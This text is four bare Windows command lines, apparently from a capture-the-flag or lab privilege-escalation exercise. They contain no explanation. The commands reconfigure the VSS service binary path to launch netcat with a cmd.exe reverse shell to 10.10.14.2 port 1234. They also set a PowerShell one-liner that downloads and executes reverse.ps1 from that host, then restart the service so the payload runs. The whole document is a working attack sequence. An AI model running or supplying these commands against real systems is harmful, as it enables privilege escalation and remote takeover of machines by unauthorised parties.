sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2 1234"  
sc.exe config vss binPath="C:\Windows\system32\cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/reverse.ps1')"  
sc.exe stop vss  
sc.exe start vss